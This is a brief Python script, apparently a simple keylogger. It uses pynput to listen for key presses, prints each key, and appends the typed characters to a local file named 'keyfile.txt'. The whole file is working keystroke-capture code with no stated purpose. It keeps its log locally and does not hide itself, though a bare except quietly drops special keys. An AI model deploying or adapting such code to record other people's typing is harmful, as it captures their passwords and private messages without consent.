from pynput import keyboard 

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listerner = keyboard.Listener(on_press=keyPressed)
    listerner.start()
    input()